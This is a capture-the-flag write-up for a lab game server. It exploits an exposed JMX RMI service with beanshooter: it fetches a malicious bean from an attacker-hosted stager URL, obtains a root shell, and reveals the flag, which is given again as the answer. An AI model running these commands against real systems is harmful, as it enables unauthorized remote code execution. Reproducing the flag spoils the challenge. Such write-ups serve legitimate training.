#### Challenge:

Ahoy, officer,
 
a new server with a video game is to be placed in the ship's relaxation center . Your task is to check whether the server does not contain any vulnerabilities.

May you have fair winds and following seas!

The game server has domain name `arkanoid.cns-jv.tcc`.

---

#### Solution:

- scanning ports reveals that `jmxrmi` API is open which could be exploited via [beanshooter](https://github.com/qtc-de/beanshooter)
    ```bash
    nmap  arkanoid.cns-jv.tcc -p- -sVC
    ```

- following the `README.md` step by step grants us `shell` access and all that is needed to look for flag
```bash
beanshooter stager 10.200.0.67 8888 tonka
beanshooter tonka deploy arkanoid.cns-jv.tcc 60001 --stager-url http://10.200.0.67:8888/ --no-stager
beanshooter tonka shell  arkanoid.cns-jv.tcc 60001
> env
HOSTNAME=52ffd33a50f7
HOME=/root
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
XFILESEARCHPATH=/usr/dt/app-defaults/%L/Dt
NLSPATH=/usr/dt/lib/nls/msg/%L/%N.cat
JAVA_HOME=/opt/jdk1.8.0_144
PWD=/opt
FLAG=FLAG{sEYj-80fd-EtkR-0fHv}

beanshooter tonka undeploy 172.17.0.2 9010
```

---

<details><summary>FLAG:</summary>

```
FLAG{sEYj-80fd-EtkR-0fHv}
```

</details>
<br/>
